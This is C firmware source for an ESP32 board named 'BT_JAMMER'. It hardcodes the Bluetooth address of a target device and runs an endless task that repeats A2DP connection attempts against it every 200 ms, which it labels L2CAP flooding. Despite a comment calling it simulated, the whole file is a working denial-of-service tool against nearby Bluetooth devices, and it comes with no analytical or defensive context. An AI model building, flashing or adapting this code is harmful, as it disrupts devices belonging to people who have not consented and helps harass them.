#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BT_JAMMER";

static esp_bd_addr_t target_device = {0xf4, 0x4e, 0xfd, 0x03, 0xa6, 0xdc};

static void esp_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    switch (event) {
        case ESP_BT_GAP_READ_REMOTE_NAME_EVT:
            if (param->read_rmt_name.stat == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Remote device name: %s", param->read_rmt_name.rmt_name);
            } else {
                ESP_LOGI(TAG, "Failed to read remote name");
            }
            break;
        default:
            break;
    }
}

// Dummy callback for A2DP registration
static void dummy_a2dp_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
    // No-op
}

// Simulated L2CAP flooding: repeatedly attempt A2DP connection
static void l2cap_flood_task(void *pvParameters) {
    while (true) {
        esp_err_t err = esp_a2d_source_connect(target_device);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "L2CAP flood connect attempt failed: %s", esp_err_to_name(err));
        } else {
            ESP_LOGI(TAG, "L2CAP flood connect attempt succeeded");
        }
        vTaskDelay(200 / portTICK_PERIOD_MS);
    }
}

void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    bt_cfg.mode = ESP_BT_MODE_CLASSIC_BT;
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_bt_gap_register_callback(esp_gap_cb));
    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_NON_DISCOVERABLE));
    ESP_ERROR_CHECK(esp_bt_gap_set_device_name("BT_JAMMER"));
    ESP_ERROR_CHECK(esp_a2d_register_callback(dummy_a2dp_cb));
    ESP_ERROR_CHECK(esp_a2d_source_init());

    xTaskCreate(l2cap_flood_task, "l2cap_flood", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "Starting L2CAP flood... Ready.");
}
